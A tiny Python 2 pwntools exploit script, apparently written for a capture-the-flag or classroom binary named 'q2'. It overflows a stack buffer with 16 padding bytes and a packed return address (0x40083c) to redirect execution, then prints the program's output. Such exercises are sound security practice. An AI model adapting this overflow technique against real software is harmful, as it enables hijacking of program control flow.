#!/usr/bin/python2
from pwn import *
io = process("./q2")
eip = struct.pack("I", 0x40083c)
io.sendline("A"*16 + eip)
print io.recvall()